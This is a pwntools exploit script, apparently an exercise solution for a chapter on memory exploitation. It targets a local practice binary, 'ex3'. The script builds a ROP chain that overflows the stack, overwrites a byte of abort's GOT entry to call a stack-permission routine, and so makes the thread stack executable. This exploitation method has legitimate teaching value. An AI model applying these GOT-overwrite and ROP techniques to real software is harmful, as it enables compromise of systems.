################################################################################
# ex3-exploit.pyÂº
#   Chapter:02
#   Binary: ex3
#   Source: ex3.c
#   Goal  : Using techniques described in Chapter2, try to make the stack
#           executable (perms rwx).
################################################################################
from pwn import *

################################################################################
#   ropOverwriteAbort():
################################################################################
def ropOverwriteAbort(value):
    
    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(binary.symbols["got.abort"])# fgets_unlocked@got
    rop +=  p64(pop_rsi)
    rop +=  p64(value)                              # rsi <- value
    rop +=  p64(pop_rdx)
    rop +=  p64(0x1)                                # rdx = 0x1
    # memset(*fgets_unlocked@got,0x90,1);
    rop +=  p64(binary.symbols["plt.memset"])       # memset()

    return rop

################################################################################
# ropFixPthread_struct(pthread_t):
#   Sets rdi to the pthread_t * structure
################################################################################
def ropFixPthread_struct(pthread_t):

    rop =   b''
    rop +=  p64(pop_rbp)
    rop +=  p64(pthread_t+0x18)
    rop +=  p64(mov_rdi)                            # rdi <- &pthread_t

    return rop

# Binary protections:
# checksec --file ex3
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)
vuln    =   "./ex3"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*112
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
pop_rdi =   0x4012a4
pop_rsi =   0x4012a6
pop_rdx =   0x4012a8
pop_rbp =   0x40116d
mov_rdi =   0x4012aa
ret     =   0x401016

# Functions grouped by 0x26300
#     0x00026310:6:sym.imp._dl_allocate_tls_init
#     0x00026320:6:sym.imp.__nptl_change_stack_perm ; 
#     0x00026340:6:sym.imp._dl_audit_preinit
#     0x0002639f:399:sym.abort
change_stack_perm   =   0x20
abort_byte          =   0x9f

# We start a local process of the vulnerable program and we debug it
# Make sure to have gef installed or "vmmap" wouldn't work:
r =  gdb.debug(binary.path,'''
        b mprotect
        commands 1
            i r rdi rsi rdx
            c
        end
        c
        c
        b main
        info threads
        vmmap
    ''')

pthread_t = binary.symbols["thread"]
info("pthread_t at *0x%02x" % pthread_t)

# What we send here will be executed by the thread itself. So basically,
# we will use this thread (the first one created) to overwrite abort@got()
# with stack_change_perms(); then it will set the stack as rwx and
# it will finally restore the original abort() call in the got:
r.send(
    padding + p64(RBP)
    + ropOverwriteAbort(change_stack_perm)
    + ropFixPthread_struct(pthread_t)
    + p64(binary.symbols["plt.abort"])
    + ropOverwriteAbort(abort_byte)
    # At this point, the stack is rwx:
    + p64(binary.symbols["main"])
    + b'\x0a'
)
print(r.recvall().decode('ascii'))
r.close()
